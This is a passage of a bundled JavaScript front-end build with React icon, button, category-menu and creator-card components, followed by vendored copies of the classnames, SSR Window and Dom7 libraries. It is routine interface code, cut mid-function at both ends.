        d: "M72.09,18.72h42.37c2.05,0,3.89,0.84,5.22,2.18c1.34,1.34,2.18,3.2,2.18,5.22v89.36 c0,2.05-0.84,3.89-2.18,5.22c-1.34,1.34-3.2,2.18-5.22,2.18H24.48c-2.05,0-3.89-0.84-5.22-2.18c-1.34-1.34-2.18-3.2-2.18-5.22 V71.46c2.47,1,5.05,1.78,7.72,2.29v20.28h0.03l0,0C37.72,81.7,46.26,75.61,59.08,65.2c0.05,0.05,0.1,0.1,0.15,0.15 c0.03,0.03,0.03,0.06,0.06,0.06l26.82,31.73l4.1-25.24c0.28-1.62,1.8-2.73,3.42-2.45c0.62,0.09,1.18,0.4,1.62,0.81l18.82,19.77 V27.91c0-0.4-0.16-0.75-0.44-0.99c-0.25-0.25-0.62-0.44-0.99-0.44H74.05C73.64,23.8,72.98,21.21,72.09,18.72L72.09,18.72z M32.79,0 C50.9,0,65.58,14.68,65.58,32.79c0,18.11-14.68,32.79-32.79,32.79C14.68,65.58,0,50.9,0,32.79C0,14.68,14.68,0,32.79,0L32.79,0z M15.37,33.37h11.04v15.76h12.45V33.37h11.36L32.8,16.44L15.37,33.37L15.37,33.37L15.37,33.37z M94.27,35.66 c2.95,0,5.66,1.21,7.58,3.14c1.96,1.96,3.14,4.63,3.14,7.59c0,2.95-1.21,5.66-3.14,7.58c-1.96,1.96-4.63,3.14-7.58,3.14 c-2.95,0-5.66-1.21-7.59-3.14c-1.96-1.96-3.14-4.63-3.14-7.58c0-2.95,1.21-5.65,3.14-7.59C88.65,36.84,91.32,35.66,94.27,35.66 L94.27,35.66L94.27,35.66z"
      })));
    case "users":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "38",
        height: "40",
        xmlns: "http://www.w3.org/2000/svg",
        viewBox: "0 0 122.88 121.84"
      }, /*#__PURE__*/React__default.createElement("title", null, "users"), /*#__PURE__*/React__default.createElement("path", {
        fill: "#F64900",
        className: "cls-1",
        d: "M58.75,51.2c4.35,9.07,17.55,9.4,21.71,0a24.53,24.53,0,0,1-2.82-3.61l-.41-.6a11.77,11.77,0,0,1-7.63,2.6,11.56,11.56,0,0,1-8.13-3.25L61.09,46c-.3.85-.68,1.86-1.1,2.8a16.59,16.59,0,0,1-1.24,2.37ZM15.22,110.33,51.83,76.14c9,9,17.83,17.83,26.89,26.78l24-24.28L91.57,67.52l31.31-.29V98.81L112.19,88.12Q95.48,105,78.78,121.84L51.64,95l-15.4,15.29Zm-.13-62.14,2.8-.07,1.33,0,2,2.34c.48.55,1,1.1,1.49,1.63a30.74,30.74,0,0,1-3.54,3.24c-.66.56-1.29,1.09-1.77,1.53A62.65,62.65,0,0,0,7.07,61.59a10.29,10.29,0,0,0-4.21,4.08C.51,70.07,1.05,75.4.09,79.91c-.29,4,0,3.77,2.79,3.72,7.84-.13,16.64-.14,24.82-.11L44.28,68l.18-.17.07-.06.36-.3,0,0,0,0,.15-.12.05,0,.2-.15h0l.22-.15,0,0,.19-.12,0,0,0,0,.17-.1h0l.08,0,.12-.07.09-.06.2-.11h0l.19-.11.06,0,.15-.07.09-.05.21-.09,0,0,.18-.07.08,0h0l.17-.07h0l.16-.06h0l.13,0h0l.16-.06h0l.19-.06h0l.13,0,.11,0,.1,0h0l.19,0,.12,0,.09,0,.15,0h0l.15,0,.19,0,.17,0h0l.14,0h0l.18,0c.31,0,.62-.07.94-.08h.57c.32,0,.63,0,.95,0l.19,0,.17,0h0a10.39,10.39,0,0,1,2.57.63,11,11,0,0,1,4.18,2.81l.59.58,7.63,7.63h17l-1.44-1.44a11.1,11.1,0,0,1,8.71-18.91l8.81-.08c-4.77-2.14-15.15-3-19.55-6.13h0l-.09-.09A23.44,23.44,0,0,1,79,46.76c-.17-.26-.35-.53-.53-.78a34.13,34.13,0,0,0,4.95-6.82l4-6.64a.54.54,0,0,0,0-.11h0c1-2.15,1.26-3.72,1-4.84a2.55,2.55,0,0,0-1.87-1.93h0l.22-9.18a13.7,13.7,0,0,0-3.46-8.67C79.41,3.55,71.12-.52,65.51.05c-1.16.12.12,2.65-1,3a18.94,18.94,0,0,0-5,2.23,13.57,13.57,0,0,0-6,7.62,14.43,14.43,0,0,0-.44,2.29,91.65,91.65,0,0,0,.17,10.12,4.61,4.61,0,0,0-.86.43,3.51,3.51,0,0,0-1.21,1.42A4.06,4.06,0,0,0,50.83,29a10.3,10.3,0,0,0,2,5.14l3.54,5.63a42.88,42.88,0,0,0,3.5,5c-.32.91-.81,2.25-1.34,3.47a14.65,14.65,0,0,1-1.07,2.08C53.55,53,45,54,39.79,55.68a33.49,33.49,0,0,1-3.14-3,22.52,22.52,0,0,0,2.4-2.59l1.27-1.52.26-.3.22-.27h2.77c4.07-8.72,1.49-21.67-6.85-27.16-2.56-1.69-4.4-1.62-7.39-1.62-3.44,0-5.19.11-8.14,2.06-4.33,2.87-7,7.83-8.12,14.72-.23,3.43-.38,9.37,2,12.14ZM31.87,63a14.64,14.64,0,0,1,1.57-3,11.84,11.84,0,0,1,3.79-3.21,10.37,10.37,0,0,1,1.2-.57,27.13,27.13,0,0,1-2.77-2.66l0,0A9.55,9.55,0,0,1,30,55.17a9.37,9.37,0,0,1-5.38-1.57,9.64,9.64,0,0,1-.94-.71A32.66,32.66,0,0,1,20,56.26l-.31.25c-.14,5,6.63,7.74,12.18,6.47ZM55.28,26.91a3.48,3.48,0,0,0-1.78.46A1.47,1.47,0,0,0,53,28a2,2,0,0,0-.16.94A8.42,8.42,0,0,0,54.51,33v0h0l3.54,5.63a30.31,30.31,0,0,0,4.76,6.25,9.73,9.73,0,0,0,6.78,2.73,10,10,0,0,0,7.18-2.85,31.05,31.05,0,0,0,4.89-6.67l4-6.57c.74-1.69,1-2.83.85-3.49-.11-.4-.54-.59-1.28-.63h-.49l-.56,0a1.46,1.46,0,0,1-.3,0,5.85,5.85,0,0,1-1.1-.06l1.37-6C74,22.94,66.43,15.42,55.73,19.84L56.5,27a6.07,6.07,0,0,1-1.22-.05Zm-35.41,20C17.59,39,18.7,31.74,24.94,25.51c1.11,3.58,3.59,6.54,7.82,8.72a41.1,41.1,0,0,1,5.86,5.39c.34-1.38-.94-3.06-2.49-4.79a7.59,7.59,0,0,1,3.69,3.61,10.06,10.06,0,0,1,.71,6.49,15.22,15.22,0,0,1-.44,2,.77.77,0,0,0-.31.22l-.5.59-.26.32-1.27,1.52a16.08,16.08,0,0,1-3.17,3.16A7.75,7.75,0,0,1,30,54.07a7.61,7.61,0,0,1-4.36-1.28,16,16,0,0,1-3.08-3l-2.31-2.68a.66.66,0,0,0-.34-.21Z"
      }));
    case "list":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "32",
        height: "40",
        xmlns: "http://www.w3.org/2000/svg",
        xmlnsXlink: "http://www.w3.org/1999/xlink",
        x: "0px",
        y: "0px",
        viewBox: "0 0 122.88 116.95",
        xmlSpace: "preserve"
      }, /*#__PURE__*/React__default.createElement("g", null, /*#__PURE__*/React__default.createElement("path", {
        fill: "#F64900",
        d: "M44.95,4.6h75.85c1.14,0,2.08,0.94,2.08,2.08v20.21c0,1.14-0.94,2.08-2.08,2.08H44.95 c-1.14,0-2.08-0.93-2.08-2.08V6.68C42.87,5.54,43.81,4.6,44.95,4.6L44.95,4.6z M16.53,83.89c4.56,0,8.7,1.85,11.69,4.84 c2.99,2.99,4.84,7.12,4.84,11.69c0,4.56-1.85,8.7-4.84,11.69c-2.99,2.99-7.12,4.84-11.69,4.84s-8.7-1.85-11.69-4.84 S0,104.98,0,100.42c0-4.56,1.85-8.7,4.84-11.69S11.96,83.89,16.53,83.89L16.53,83.89z M23.47,93.47c-1.78-1.78-4.23-2.88-6.94-2.88 s-5.17,1.1-6.94,2.88c-1.78,1.78-2.88,4.23-2.88,6.94c0,2.71,1.1,5.17,2.88,6.95c1.78,1.78,4.23,2.88,6.95,2.88s5.17-1.1,6.94-2.88 c1.78-1.78,2.88-4.23,2.88-6.95C26.35,97.71,25.25,95.25,23.47,93.47L23.47,93.47z M44.95,88.49h75.85c1.14,0,2.08,0.93,2.08,2.08 v20.21c0,1.14-0.94,2.08-2.08,2.08H44.95c-1.14,0-2.08-0.93-2.08-2.08V90.57C42.87,89.43,43.81,88.49,44.95,88.49L44.95,88.49z M16.53,41.95c4.56,0,8.7,1.85,11.69,4.84c2.99,2.99,4.84,7.12,4.84,11.69c0,4.56-1.85,8.7-4.84,11.69 C25.22,73.15,21.09,75,16.53,75s-8.7-1.85-11.69-4.84C1.85,67.17,0,63.04,0,58.47c0-4.56,1.85-8.7,4.84-11.69 C7.83,43.8,11.96,41.95,16.53,41.95L16.53,41.95z M23.47,51.53c-1.78-1.78-4.23-2.88-6.94-2.88s-5.17,1.1-6.94,2.88 c-1.78,1.78-2.88,4.23-2.88,6.94c0,2.71,1.1,5.17,2.88,6.95c1.78,1.78,4.23,2.88,6.94,2.88s5.17-1.1,6.94-2.88 c1.78-1.78,2.88-4.23,2.88-6.95C26.35,55.76,25.25,53.31,23.47,51.53L23.47,51.53z M44.95,46.55h75.85c1.14,0,2.08,0.94,2.08,2.08 v20.21c0,1.14-0.94,2.08-2.08,2.08H44.95c-1.14,0-2.08-0.93-2.08-2.08V48.62C42.87,47.48,43.81,46.55,44.95,46.55L44.95,46.55z M16.53,12.35c2.31,0,4.18,1.87,4.18,4.18c0,2.31-1.87,4.18-4.18,4.18c-2.31,0-4.18-1.87-4.18-4.18 C12.35,14.22,14.22,12.35,16.53,12.35L16.53,12.35z M16.53,0c4.56,0,8.7,1.85,11.69,4.84c2.99,2.99,4.84,7.12,4.84,11.69 s-1.85,8.7-4.84,11.69c-2.99,2.99-7.12,4.84-11.69,4.84s-8.7-1.85-11.69-4.84C1.85,25.22,0,21.09,0,16.53s1.85-8.7,4.84-11.69 S11.96,0,16.53,0L16.53,0z M23.47,9.58c-1.78-1.78-4.23-2.88-6.94-2.88s-5.17,1.1-6.94,2.88c-1.78,1.78-2.88,4.23-2.88,6.94 s1.1,5.17,2.88,6.94c1.78,1.78,4.23,2.88,6.95,2.88s5.17-1.1,6.94-2.88c1.78-1.78,2.88-4.23,2.88-6.94S25.25,11.36,23.47,9.58 L23.47,9.58z"
      })));
    case "deposit":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "32",
        height: "40",
        id: "Layer_1",
        "data-name": "Layer 1",
        xmlns: "http://www.w3.org/2000/svg",
        viewBox: "0 0 105.05 122.88"
      }, /*#__PURE__*/React__default.createElement("title", null, "money-saving"), /*#__PURE__*/React__default.createElement("path", {
        fill: "#F64900",
        className: "cls-1",
        d: "M68.11,51.49a18.57,18.57,0,0,1,3.74-1.91A40.38,40.38,0,0,1,79.39,49c3.64-.09,7.27.23,7.63,1a4,4,0,0,1,.41,2.1,4.73,4.73,0,0,1-.68,2A13.94,13.94,0,0,1,82.44,58c-1.66,1.14-3.18,2.19-2.93,3,0,.07.18.2.42.4a15.56,15.56,0,0,0,1.44,1,22.17,22.17,0,0,1,5.37,4.44,27.81,27.81,0,0,1,3.8,5.89c.34.67.67,1.37,1,2.09s.66,1.54,1,2.33l.06.25a6.8,6.8,0,0,0,.74,2.39c.15.25.3.37.44.37h1.76l.69,0c1.64-.12,2.56-.18,3.51,2.28a16.84,16.84,0,0,1,.79,6.43,23.5,23.5,0,0,1-1.25,6.91,4.8,4.8,0,0,1-1.61,2.79,5.61,5.61,0,0,1-3.25,1.19h-2c-.83,0-1.56,0-2.1,0s-.62-.09-.69-.05,0,.05-.11.23a19.77,19.77,0,0,1-2,2.42c-.82.85-1.78,1.79-2.7,2.66s-1.7,1.56-2.4,2.15l-.43.36a7.37,7.37,0,0,0-1.2,1.07,7.57,7.57,0,0,0,.67,1.88c.2.48.32.76.36.87.47,1.15.94,2.26,1.36,3.23.71,1.64,1.5,3.38,1.75,4l0,.06c.58,1.47.45,2.59-.36,3.39a4,4,0,0,1-3.24.83H74.33a4.79,4.79,0,0,1-2.74-.63,7.16,7.16,0,0,1-2.24-2.11l-.06-.11a18.13,18.13,0,0,1-.8-1.64c-.67-1.51-1.51-3.38-2.19-3.11a42.35,42.35,0,0,1-14.19,3.08,49.66,49.66,0,0,1-16.17-2.41c-1.73-.24-2.08.49-2.64,1.65-.16.33-.32.68-.55,1.12h0c-.14.28-.19.4-.24.5-.8,1.71-1.57,3.36-4,3.85l-.26,0-8.91-.07h-.09a3.54,3.54,0,0,1-1.45-.39,2.65,2.65,0,0,1-1.14-1.11c-.79-1.45-.26-2.54.28-3.65h0l.21-.43h0l3.13-6.85.06-.12a2.09,2.09,0,0,0,.38-1.39,2,2,0,0,0-.77-1h0c-.62-.44-1.23-.9-1.81-1.36s-1.17-1-1.73-1.49a32.21,32.21,0,0,1-5-5.84A30.67,30.67,0,0,1,8,92.41a25.73,25.73,0,0,1-1.36-5.67c0-.44-.09-.89-.12-1.34a11.22,11.22,0,0,1-5.9-7.13c-1-3.33-.87-7.47.61-12.08l2.5.8a18,18,0,0,0-.59,10.52A8.86,8.86,0,0,0,6.59,82.4c0-.39.08-.79.13-1.18A28.77,28.77,0,0,1,11.38,69.4,36.27,36.27,0,0,1,23.73,58l.2.14L39.64,68a47.29,47.29,0,0,0-8.16,2,3.74,3.74,0,0,0,2.44,7.07A40,40,0,0,1,47.23,75,47.49,47.49,0,0,1,61,77.19,3.75,3.75,0,0,0,63.18,70a59.27,59.27,0,0,0-6.1-1.55l11-17ZM104.17,4.61H95.29a.89.89,0,0,0-.88.87V27.05a.88.88,0,0,0,.88.87h8.88a.88.88,0,0,0,.88-.87V5.48a.88.88,0,0,0-.88-.87Zm-12,3.85a1.68,1.68,0,0,0-.28-1.05c-.57-.77-2-.54-2.85-.54a12.58,12.58,0,0,1-2.73-.22,31.09,31.09,0,0,1-3.89-1.29c-4.83-1.73-8.94-2.8-14-5a3.88,3.88,0,0,0-3.25,0A84.62,84.62,0,0,0,51.59,6.73a5.43,5.43,0,0,0-1.16.84,5.16,5.16,0,0,0-.87,1.17c-2.79,4-5.18,8.16-7.47,12.27-.77,1.44-1.09,2.81-.56,3.67,2.15,3.54,6-1.49,10.2-4.84,1.76-1.41,4.15-2.66,6.2-4.09,2.64-1.1,3.87-2.15,6.7-2.74,4.34-.38,4.7,5.85-1,6.08-3.87.15-11.85,3.66-14.09,6.9-2.09,3-.94,6,3.32,5.87l3.56-.66c5.66-1.07,5.5-1.28,11.41-.18,3.17.58,6.49,1.2,9.75.59,2-.37,3-1.17,4.81-2.52a16.37,16.37,0,0,1,2.83-2A10.82,10.82,0,0,1,87.8,26c1.36-.32,3.27.14,4.06-1a2.23,2.23,0,0,0,.33-1.17V8.46ZM47.89,36.32a6.29,6.29,0,1,0,7.48.57c-.62.13-1.17.26-1.52.32h0a6.4,6.4,0,0,1-.88.09,11.14,11.14,0,0,1-5.08-1Zm-6.63-4.9L27.08,53.25l23.39,14.8L70.63,37c-1.33-.18-2.57-.41-3.79-.63l-.78-.15-14.49,22a4.09,4.09,0,0,0-5.64,1.26l-9.24-5.86A4.09,4.09,0,0,0,35.43,48l9.31-14.13a8.22,8.22,0,0,1-1.2-2.2,5.83,5.83,0,0,1-2.28-.2Zm36.11,44a4.27,4.27,0,1,1-3,1.25,4.17,4.17,0,0,1,3-1.25Z"
      }));
    case "flow":
      return /*#__PURE__*/React__default.createElement(Image, _extends$3({
        src: "/flow.svg",
        alt: alt !== null && alt !== void 0 ? alt : "flow"
      }, props));
  }
};

var _excluded$6 = ["type", "icon", "iconClass", "children"];
var Button = function Button(_ref) {
  var type = _ref.type,
    icon = _ref.icon,
    iconClass = _ref.iconClass,
    children = _ref.children,
    props = _objectWithoutProperties(_ref, _excluded$6);
  return /*#__PURE__*/React__default.createElement("button", _extends$3({
    type: type
  }, props), icon ? /*#__PURE__*/React__default.createElement(Icon, {
    type: icon,
    className: iconClass
  }) : null, children);
};

var classnames$1 = {exports: {}};

/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/

var hasRequiredClassnames;

function requireClassnames () {
	if (hasRequiredClassnames) return classnames$1.exports;
	hasRequiredClassnames = 1;
	(function (module) {
		/* global define */

		(function () {

			var hasOwn = {}.hasOwnProperty;

			function classNames () {
				var classes = '';

				for (var i = 0; i < arguments.length; i++) {
					var arg = arguments[i];
					if (arg) {
						classes = appendClass(classes, parseValue(arg));
					}
				}

				return classes;
			}

			function parseValue (arg) {
				if (typeof arg === 'string' || typeof arg === 'number') {
					return arg;
				}

				if (typeof arg !== 'object') {
					return '';
				}

				if (Array.isArray(arg)) {
					return classNames.apply(null, arg);
				}

				if (arg.toString !== Object.prototype.toString && !arg.toString.toString().includes('[native code]')) {
					return arg.toString();
				}

				var classes = '';

				for (var key in arg) {
					if (hasOwn.call(arg, key) && arg[key]) {
						classes = appendClass(classes, key);
					}
				}

				return classes;
			}

			function appendClass (value, newClass) {
				if (!newClass) {
					return value;
				}
			
				if (value) {
					return value + ' ' + newClass;
				}
			
				return value + newClass;
			}

			if (module.exports) {
				classNames.default = classNames;
				module.exports = classNames;
			} else {
				window.classNames = classNames;
			}
		}()); 
	} (classnames$1));
	return classnames$1.exports;
}

var classnamesExports = requireClassnames();
var classnames = /*@__PURE__*/getDefaultExportFromCjs(classnamesExports);

var CategoryMenu = function CategoryMenu() {
  var _useState = useState({}),
    _useState2 = _slicedToArray(_useState, 2),
    active = _useState2[0],
    setActive = _useState2[1];
  var categories = [{
    name: 'All',
    icon: 'category-all'
  }, {
    name: 'Products',
    icon: 'technology'
  }, {
    name: "Promotions",
    icon: 'ticket'
  }, {
    name: 'Companies',
    icon: 'real-estate'
  }, {
    name: 'Services',
    icon: 'technology'
  }, {
    name: "Brand",
    icon: 'copyright'
  }, {
    name: "Tickets",
    icon: 'ticket'
  }];
  var categoryClicked = function categoryClicked(item) {
    setActive(item);
  };
  return /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col"
  }, /*#__PURE__*/React__default.createElement("p", {
    className: "text-base font-medium text-trout mb-1.5"
  }, "Categories"), /*#__PURE__*/React__default.createElement("div", {
    className: "w-56 py-3 bg-white rounded-2xl"
  }, categories === null || categories === void 0 ? void 0 : categories.map(function (item, idx) {
    return /*#__PURE__*/React__default.createElement("div", {
      className: classnames('flex py-5 pl-6 mr-0.5 bg-white group cursor-pointer relative hover:bg-orange/[0.08] hover:before:block hover:before:absolute hover:before:left-0 hover:before:h-full hover:before:w-1 hover:before:top-0 hover:before:bg-orange', {
        'bg-orange/[0.08] before:block before:absolute before:left-0 before:h-full before:w-1 before:top-0 before:bg-orange': active.name === item.name
      }),
      onClick: function onClick() {
        return categoryClicked(item);
      },
      key: "category-".concat(idx),
      title: 'Category'
    }, /*#__PURE__*/React__default.createElement(Icon, {
      type: item.icon,
      className: classnames('group-hover:fill-orange', {
        'fill-orange': active.name === item.name
      })
    }), /*#__PURE__*/React__default.createElement("span", {
      className: classnames('text-base  ml-7 group-hover:text-orange group-hover:font-bold', {
        'text-orange font-bold': active.name === item.name,
        'text-rolling-stone': active.name !== item.name
      })
    }, item.name));
  })));
};

var _excluded$5 = ["item", "id"];
var CreatorCard = function CreatorCard(_ref) {
  var item = _ref.item,
    id = _ref.id,
    props = _objectWithoutProperties(_ref, _excluded$5);
  return /*#__PURE__*/React__default.createElement("div", props, /*#__PURE__*/React__default.createElement("div", {
    className: "relative w-full h-32"
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/creators/".concat(item.bgUrl),
    alt: "bg-".concat(id),
    layout: "fill",
    objectFit: "cover",
    className: "rounded-[10px]"
  })), /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col items-center justify-center w-full -mt-[70px]"
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/creators/".concat(item.avatarUrl),
    alt: "avatar-".concat(id),
    width: 140,
    height: 140,
    className: "flex items-center border-8 border-white rounded-full"
  }), /*#__PURE__*/React__default.createElement("span", {
    className: "text-xl text-black/[0.8] mt-1 font-medium"
  }, item.name), /*#__PURE__*/React__default.createElement("span", {
    className: "text-base text-rolling-stone leading-[22px] px-7 mt-3 text-center"
  }, item.description)));
};

/**
 * SSR Window 4.0.2
 * Better handling for window object in SSR environment
 * https://github.com/nolimits4web/ssr-window
 *
 * Copyright 2021, Vladimir Kharlampidi
 *
 * Licensed under MIT
 *
 * Released on: December 13, 2021
 */
/* eslint-disable no-param-reassign */
function isObject$2(obj) {
    return (obj !== null &&
        typeof obj === 'object' &&
        'constructor' in obj &&
        obj.constructor === Object);
}
function extend$2(target = {}, src = {}) {
    Object.keys(src).forEach((key) => {
        if (typeof target[key] === 'undefined')
            target[key] = src[key];
        else if (isObject$2(src[key]) &&
            isObject$2(target[key]) &&
            Object.keys(src[key]).length > 0) {
            extend$2(target[key], src[key]);
        }
    });
}

const ssrDocument = {
    body: {},
    addEventListener() { },
    removeEventListener() { },
    activeElement: {
        blur() { },
        nodeName: '',
    },
    querySelector() {
        return null;
    },
    querySelectorAll() {
        return [];
    },
    getElementById() {
        return null;
    },
    createEvent() {
        return {
            initEvent() { },
        };
    },
    createElement() {
        return {
            children: [],
            childNodes: [],
            style: {},
            setAttribute() { },
            getElementsByTagName() {
                return [];
            },
        };
    },
    createElementNS() {
        return {};
    },
    importNode() {
        return null;
    },
    location: {
        hash: '',
        host: '',
        hostname: '',
        href: '',
        origin: '',
        pathname: '',
        protocol: '',
        search: '',
    },
};
function getDocument() {
    const doc = typeof document !== 'undefined' ? document : {};
    extend$2(doc, ssrDocument);
    return doc;
}

const ssrWindow = {
    document: ssrDocument,
    navigator: {
        userAgent: '',
    },
    location: {
        hash: '',
        host: '',
        hostname: '',
        href: '',
        origin: '',
        pathname: '',
        protocol: '',
        search: '',
    },
    history: {
        replaceState() { },
        pushState() { },
        go() { },
        back() { },
    },
    CustomEvent: function CustomEvent() {
        return this;
    },
    addEventListener() { },
    removeEventListener() { },
    getComputedStyle() {
        return {
            getPropertyValue() {
                return '';
            },
        };
    },
    Image() { },
    Date() { },
    screen: {},
    setTimeout() { },
    clearTimeout() { },
    matchMedia() {
        return {};
    },
    requestAnimationFrame(callback) {
        if (typeof setTimeout === 'undefined') {
            callback();
            return null;
        }
        return setTimeout(callback, 0);
    },
    cancelAnimationFrame(id) {
        if (typeof setTimeout === 'undefined') {
            return;
        }
        clearTimeout(id);
    },
};
function getWindow() {
    const win = typeof window !== 'undefined' ? window : {};
    extend$2(win, ssrWindow);
    return win;
}

/**
 * Dom7 4.0.6
 * Minimalistic JavaScript library for DOM manipulation, with a jQuery-compatible API
 * https://framework7.io/docs/dom7.html
 *
 * Copyright 2023, Vladimir Kharlampidi
 *
 * Licensed under MIT
 *
 * Released on: February 2, 2023
 */

/* eslint-disable no-proto */
function makeReactive(obj) {
  const proto = obj.__proto__;
  Object.defineProperty(obj, '__proto__', {
    get() {
      return proto;
    },

    set(value) {
      proto.__proto__ = value;
    }

  });
}

class Dom7 extends Array {
  constructor(items) {
    if (typeof items === 'number') {
      super(items);
    } else {
      super(...(items || []));
      makeReactive(this);
    }
  }

}

function arrayFlat(arr = []) {
  const res = [];
  arr.forEach(el => {
    if (Array.isArray(el)) {
      res.push(...arrayFlat(el));
    } else {
      res.push(el);
    }
  });
  return res;
}
function arrayFilter(arr, callback) {
  return Array.prototype.filter.call(arr, callback);
}
function arrayUnique(arr) {
  const uniqueArray = [];

  for (let i = 0; i < arr.length; i += 1) {
    if (uniqueArray.indexOf(arr[i]) === -1) uniqueArray.push(arr[i]);
  }

  return uniqueArray;
}

// eslint-disable-next-line

function qsa(selector, context) {
  if (typeof selector !== 'string') {
    return [selector];
  }

  const a = [];
  const res = context.querySelectorAll(selector);

  for (let i = 0; i < res.length; i += 1) {
    a.push(res[i]);
  }

  return a;
}

function $(selector, context) {
  const window = getWindow();
  const document = getDocument();
  let arr = [];

  if (!context && selector instanceof Dom7) {
    return selector;
  }

  if (!selector) {
    return new Dom7(arr);
  }

  if (typeof selector === 'string') {
    const html = selector.trim();

    if (html.indexOf('<') >= 0 && html.indexOf('>') >= 0) {
      let toCreate = 'div';
      if (html.indexOf('<li') === 0) toCreate = 'ul';
      if (html.indexOf('<tr') === 0) toCreate = 'tbody';
      if (html.indexOf('<td') === 0 || html.indexOf('<th') === 0) toCreate = 'tr';
      if (html.indexOf('<tbody') === 0) toCreate = 'table';
      if (html.indexOf('<option') === 0) toCreate = 'select';
      const tempParent = document.createElement(toCreate);
      tempParent.innerHTML = html;

      for (let i = 0; i < tempParent.childNodes.length; i += 1) {
        arr.push(tempParent.childNodes[i]);
      }
    } else {
      arr = qsa(selector.trim(), context || document);
    } // arr = qsa(selector, document);

  } else if (selector.nodeType || selector === window || selector === document) {
    arr.push(selector);
  } else if (Array.isArray(selector)) {
    if (selector instanceof Dom7) return selector;
    arr = selector;
  }

  return new Dom7(arrayUnique(arr));
}

$.fn = Dom7.prototype;

// eslint-disable-next-line

function addClass(...classes) {
  const classNames = arrayFlat(classes.map(c => c.split(' ')));
  this.forEach(el => {
    el.classList.add(...classNames);
  });
  return this;
}

function removeClass(...classes) {
  const classNames = arrayFlat(classes.map(c => c.split(' ')));
  this.forEach(el => {
    el.classList.remove(...classNames);
  });
  return this;
}

function toggleClass(...classes) {
  const classNames = arrayFlat(classes.map(c => c.split(' ')));
  this.forEach(el => {
    classNames.forEach(className => {
      el.classList.toggle(className);
    });
  });
}

function hasClass(...classes) {
  const classNames = arrayFlat(classes.map(c => c.split(' ')));
  return arrayFilter(this, el => {
    return classNames.filter(className => el.classList.contains(className)).length > 0;
  }).length > 0;
}

function attr(attrs, value) {
  if (arguments.length === 1 && typeof attrs === 'string') {
    // Get attr
    if (this[0]) return this[0].getAttribute(attrs);
    return undefined;
  } // Set attrs


  for (let i = 0; i < this.length; i += 1) {
    if (arguments.length === 2) {
      // String
      this[i].setAttribute(attrs, value);
    } else {
      // Object
      for (const attrName in attrs) {
        this[i][attrName] = attrs[attrName];
        this[i].setAttribute(attrName, attrs[attrName]);
      }
    }
  }

  return this;
}

function removeAttr(attr) {
  for (let i = 0; i < this.length; i += 1) {
    this[i].removeAttribute(attr);
  }

  return this;
}

function transform(transform) {
  for (let i = 0; i < this.length; i += 1) {
    this[i].style.transform = transform;
  }

  return this;
}

function transition$1(duration) {
  for (let i = 0; i < this.length; i += 1) {
    this[i].style.transitionDuration = typeof duration !== 'string' ? `${duration}ms` : duration;
  }

  return this;
}

function on(...args) {
  let [eventType, targetSelector, listener, capture] = args;

  if (typeof args[1] === 'function') {
    [eventType, listener, capture] = args;
    targetSelector = undefined;
  }

  if (!capture) capture = false;

  function handleLiveEvent(e) {
    const target = e.target;
    if (!target) return;
    const eventData = e.target.dom7EventData || [];

    if (eventData.indexOf(e) < 0) {
      eventData.unshift(e);
    }

    if ($(target).is(targetSelector)) listener.apply(target, eventData);else {
      const parents = $(target).parents(); // eslint-disable-line

      for (let k = 0; k < parents.length; k += 1) {
        if ($(parents[k]).is(targetSelector)) listener.apply(parents[k], eventData);
      }
    }
  }

  function handleEvent(e) {
    const eventData = e && e.target ? e.target.dom7EventData || [] : [];

    if (eventData.indexOf(e) < 0) {
      eventData.unshift(e);
    }

    listener.apply(this, eventData);
  }

  const events = eventType.split(' ');
  let j;

  for (let i = 0; i < this.length; i += 1) {
    const el = this[i];

    if (!targetSelector) {
      for (j = 0; j < events.length; j += 1) {
        const event = events[j];
        if (!el.dom7Listeners) el.dom7Listeners = {};
        if (!el.dom7Listeners[event]) el.dom7Listeners[event] = [];
        el.dom7Listeners[event].push({
          listener,
          proxyListener: handleEvent
        });
        el.addEventListener(event, handleEvent, capture);
      }
    } else {
      // Live events
      for (j = 0; j < events.length; j += 1) {
        const event = events[j];
        if (!el.dom7LiveListeners) el.dom7LiveListeners = {};
        if (!el.dom7LiveListeners[event]) el.dom7LiveListeners[event] = [];
        el.dom7LiveListeners[event].push({
          listener,
          proxyListener: handleLiveEvent
        });
        el.addEventListener(event, handleLiveEvent, capture);
      }
    }
  }

  return this;
}

function off(...args) {
  let [eventType, targetSelector, listener, capture] = args;

  if (typeof args[1] === 'function') {
    [eventType, listener, capture] = args;
    targetSelector = undefined;
  }

  if (!capture) capture = false;
  const events = eventType.split(' ');

  for (let i = 0; i < events.length; i += 1) {
    const event = events[i];

    for (let j = 0; j < this.length; j += 1) {
      const el = this[j];
      let handlers;

      if (!targetSelector && el.dom7Listeners) {
        handlers = el.dom7Listeners[event];
      } else if (targetSelector && el.dom7LiveListeners) {
        handlers = el.dom7LiveListeners[event];
      }

      if (handlers && handlers.length) {
        for (let k = handlers.length - 1; k >= 0; k -= 1) {
          const handler = handlers[k];

          if (listener && handler.listener === listener) {
            el.removeEventListener(event, handler.proxyListener, capture);
            handlers.splice(k, 1);
          } else if (listener && handler.listener && handler.listener.dom7proxy && handler.listener.dom7proxy === listener) {
            el.removeEventListener(event, handler.proxyListener, capture);
            handlers.splice(k, 1);
          } else if (!listener) {
            el.removeEventListener(event, handler.proxyListener, capture);
            handlers.splice(k, 1);
          }
        }
      }
    }
  }

  return this;
}

function trigger(...args) {
  const window = getWindow();
  const events = args[0].split(' ');
  const eventData = args[1];

  for (let i = 0; i < events.length; i += 1) {
    const event = events[i];

    for (let j = 0; j < this.length; j += 1) {
      const el = this[j];

      if (window.CustomEvent) {
        const evt = new window.CustomEvent(event, {
          detail: eventData,
          bubbles: true,
          cancelable: true
        });
        el.dom7EventData = args.filter((data, dataIndex) => dataIndex > 0);
        el.dispatchEvent(evt);
        el.dom7EventData = [];
        delete el.dom7EventData;
      }
    }
  }

  return this;
}

function transitionEnd$1(callback) {
  const dom = this;

  function fireCallBack(e) {
    if (e.target !== this) return;
    callback.call(this, e);
    dom.off('transitionend', fireCallBack);
  }

  if (callback) {
